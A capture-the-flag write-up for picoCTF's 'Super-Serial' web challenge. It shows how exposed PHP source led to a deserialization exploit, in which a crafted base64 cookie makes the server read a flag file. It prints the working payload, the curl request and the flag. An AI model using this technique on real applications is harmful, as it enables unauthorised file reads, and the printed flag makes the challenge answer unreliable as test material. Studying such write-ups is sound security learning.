# Super-Serial

## FLAG: picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}

## Status: Complete

Category: Web-Exploit

Description: Try to recover the flag stored on this website <http://mercury.picoctf.net:42449/>

## STEPS

1. Navigate to website
2. Inspect source code
3. Look for robots.txt

    ```text
        User-agent: *
        Disallow: /admin.phps
    ```

4. Let's try admin.phps -> error 404 not found
5. Let's try index.phps -> we see source code
   1. wget <http://mercury.picoctf.net:42449/index.phps>
   2. In here we see the PHP source code
   3. Specifically we see `require_once('cookie.php')`
   4. We also see `header("Location: authentication.php");`
   5. wget <http://mercury.picoctf.net:42449/cookie.phps> - COOKIE.PHP
   6. wget <http://mercury.picoctf.net:42449/authentication.phps> - AUTHENTICATION.PHP

## NEED HELP CREDIT @Dvd848 - <https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Super_Serial.md>

1. On login we create `new permissions($un, $pass)` and pass it username and password
2. Then to authenticate it will check the new `permissions` object to see if `is_admin()` == `TRUE` or if `is_guest` == `TRUE`
   1. Note it will only return `is_admin() == TRUE` if there is a valid user in the database
3. If there is a user or if the person is a guest the server will cache a cookie

    ```php
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
    ```

4. Then next time it looks to pull directly from the cached cookie

    ```php
        if(isset($_COOKIE["login"])){
            try{
                $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
                $g = $perm->is_guest();
                $a = $perm->is_admin();
            }
            catch(Error $e){
                die("Deserialization error. ".$perm);
            }
        }
    ```

5. Now we want to use the `access_log` class to use its own `_toString()` function to output the contents of the flag file
   1. ie. `$this->log_file = "../flag"`
6. Let's create a php file to do this `get_flag.php`
   1. In here we copy the `access_log` class from `authentication.php` and paste into `get_flag.php`
   2. Then make a new `access_log` object that points to the flag file `accesslog("../flag")`
   3. Then serialize, base64-encode, and finally urlencode the newly made object -> `urlencode(base64_encode(serialize($get_flag)));`
   4. Finally echo the output
7. Run the php file

    ```bash
        php -e get_flag.php
    ```

8. Output: `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`
9. Now let's use this in the cookie that we pass to the server, but we need ti use the `login=` header in the curl command

    ```bash
        curl http://mercury.picoctf.net:42449/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
    ```

10. The flag is then returned: `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}`
